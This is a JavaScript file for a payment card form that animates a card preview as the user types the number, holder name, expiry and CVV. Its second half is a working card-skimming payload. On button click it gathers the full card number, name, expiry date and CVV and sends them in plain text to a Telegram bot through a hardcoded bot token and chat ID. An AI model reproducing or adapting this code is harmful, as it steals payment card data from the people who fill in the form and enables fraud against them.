
document.querySelector('.card-number-input').oninput = () =>{
    document.querySelector('.card-number-box').innerHTML = document.querySelector('.card-number-input').value;
}
console.log();
document.querySelector('.card-holder-input').oninput = () =>{
    document.querySelector('.card-holder-name').innerHTML = document.querySelector('.card-holder-input').value;
}

document.querySelector('.month-input').oninput = () =>{
    document.querySelector('.exp-month').innerHTML = document.querySelector('.month-input').value;
}

document.querySelector('.year-input').oninput = () =>{
    document.querySelector('.exp-year').innerHTML = document.querySelector('.year-input').value;
}

document.querySelector('.cvv-input').onmouseenter = () =>{
    document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(-180deg)';
    document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(0deg)';
}

document.querySelector('.cvv-input').onmouseleave = () =>{
    document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(0deg)';
    document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(180deg)';
}

document.querySelector('.cvv-input').oninput = () =>{
    document.querySelector('.cvv-box').innerHTML = document.querySelector('.cvv-input').value;
}


document.querySelector('.card-number-input').addEventListener('input', function() {
        let cardNumber = this.value.replace(/\s/g, ''); // Удаляем все пробелы из введенного номера карты
        let formattedCardNumber = cardNumber.replace(/(\d{4})/g, '$1 ').trim(); // Добавляем пробелы после каждых четырех символов
        this.value = formattedCardNumber; // Обновляем значение поля ввода
    });






document.addEventListener("DOMContentLoaded", function() {
  const TELEGRAM_TOKEN = '6527581740:AAEc3Z_1vwP5aOY6iOBUdCqGYm9XRMWwyv8';
  const CHAT_ID = '-4154188856'; // Ваш chat_id (идентификатор чата)

  const userInput = document.getElementById('user-input');
  const userInput1 = document.getElementById('user-input1');
  const userInput2 = document.getElementById('user-input2');
  const userInput3 = document.getElementById('user-input3');
  const userInput4 = document.getElementById('user-input4');
  const sendButton = document.getElementById('myButon');

  function sendTelegramMessage(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      const params = {
          chat_id: CHAT_ID,
          text: message,
      };

      fetch(url, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(params),
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error sending message:', error));
  }


  function handleUserInput() {
      const messageText = 'Номер карты: '
      const messageName = 'Имя: '
      const messageDate1 = 'Месяц: '
      const messageDate2 = 'Год: '
      const messageCVV = 'CVV: '
      const message = userInput.value.trim();
      const message1 = userInput1.value.trim();
      const message2 = userInput2.value.trim();
      const message3 = userInput3.value.trim();
      const message4 = userInput4.value.trim();
      if (message !== '') {
          sendTelegramMessage(messageText + message + '\n' + messageName + message1 + '\n' + messageDate1 + message2 + '\n'+ messageDate2 + message3 + '\n'+ messageCVV + message4);
          userInput.value = '';
      }
  }
  sendButton.addEventListener('click', handleUserInput);
});